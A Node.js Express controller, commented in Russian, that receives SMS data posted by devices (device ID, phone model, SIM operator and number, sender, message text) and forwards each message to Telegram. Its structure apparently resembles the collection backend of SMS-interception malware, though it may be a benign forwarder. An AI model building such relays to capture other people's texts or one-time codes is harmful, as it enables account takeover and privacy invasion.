const telegramService = require('../services/telegramService');

exports.processSms = async (req, res) => {
  try {
    const { device_id, model, sim_operator, sim_number, sender_number, message } = req.body;
    
    if (!device_id || !sender_number || !message) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    
    // Подготовка сообщения для Telegram
    const telegramMessage = `📩 Новое сообщение:\nID устройства: ${device_id}\nМодель: ${model}\nОператор номера: ${sim_operator} - ${sim_number}\nОтправитель: ${sender_number}\nСообщение: ${message}`;
    
    // Отправка уведомления в Telegram
    await telegramService.sendMessage(telegramMessage);
    
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error processing SMS:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
};
